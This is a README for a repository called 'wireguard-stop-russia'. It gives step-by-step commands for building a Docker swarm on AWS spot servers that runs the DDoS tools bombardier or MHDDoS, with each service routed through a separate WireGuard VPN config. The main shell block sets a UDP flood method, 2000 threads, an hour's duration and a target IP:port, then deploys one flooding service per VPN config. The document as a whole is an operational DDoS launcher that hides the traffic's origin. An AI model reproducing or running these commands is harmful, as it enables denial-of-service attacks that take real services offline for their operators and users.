#### VPN servers:
* Install Wireguard in several AWS regions
* Generate wireguard configs from this services
* Wireguard HowTo:
  * Just google...
  * Register on [VPN Unlimited](https://www.vpnunlimited.com/ru/) and export wireguard config from your account

##### Docker swarm bombardier or MHDDoS via wireguard
* ``` mkdir -p /home/$USER/wireguard-conf ```
* Put wireguard configs to some directory (example: /home/$USER/wireguard-conf)
* Spin-up spot server on AWS with Ubuntu 20.04
* Install docker
* Add tour current user to docker group ```  sudo usermod -aG docker $USER ```
* Install wireguard package on this server ``` sudo apt install wireguard ```
* Clone repo:
  * to use bombardier clone master branch:
  ``` bash
  git clone https://github.com/neironus/wireguard-stop-russia.git
  ```
  * to use MHDDoS clone dripper branch 
  ``` bash
  git clone --branch dripper https://github.com/neironus/wireguard-stop-russia.git
  ```
* Change directory to this repo
* Build docker image (It take about - 20 minutes, feel free to optimize the process): 
    ``` bash 
    DOCKER_BUILDKIT=1 docker build --tag wireguard-stop-russia . 
    ```

``` bash
# Init docker swarm
docker swarm init --advertise-addr $(hostname -i)
# If you dot an error please use next command:  
docker swarm init
# Create services with wireguard configs
# One wireguard config == 1 service with 1 replica
export WG_CONF_DIR=/home/$USER/wireguard-conf
export WIREGUARD_PORT=51820
export METHOD=udp
export IP_PORT=1.1.1.1:53 # Example!!! Don't use 1.1.1.1
export THREADS=2000
export DURATION=3600
for i in $(ls $WG_CONF_DIR); do arrIN=(${i//./ }); name=${arrIN[0]}; export WIREGUARD_CLIENT_CONFIG="$WG_CONF_DIR/$i"; docker stack deploy -c docker-compose.yml $name; sleep 1; done

# Delete services
export WG_CONF_DIR=/home/$USER/wireguard-conf
for i in $(ls $WG_CONF_DIR); do arrIN=(${i//./ }); name=${arrIN[0]}; docker stack rm $name; sleep 1; done


# List containers
docker ps 

# Get top from specific container (Get container id form prevues command)
docker top container-id 

# Get logs from specific container
docker logs container-id 
docker logs -f container-id 
```
``` bash
for i in $(ls $WG_CONF_DIR); do arrIN=(${i//./ }); name=${arrIN[0]}; export WIREGUARD_CLIENT_CONFIG="$WG_CONF_DIR/$i"; echo "$name - $WIREGUARD_CLIENT_CONFIG"; sleep 1; done

```